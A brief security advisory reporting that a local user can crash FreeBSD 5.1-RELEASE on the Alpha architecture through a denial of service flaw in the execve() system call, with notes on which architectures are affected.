It is reported that FreeBSD running on the Alpha architecture is susceptible to a denial of service vulnerability in its execve() system call.

An attacker with local interactive user-level access on an affected machine is reportedly able to crash FreeBSD when running on the Alpha architecture, denying service to legitimate users.

FreeBSD 5.1-RELEASE/Alpha is reported vulnerable, other architectures with strict memory alignment requirements are also likely vulnerable. IA32 is reported immune. Versions other than 5.1-RELEASE are likely affected as well.
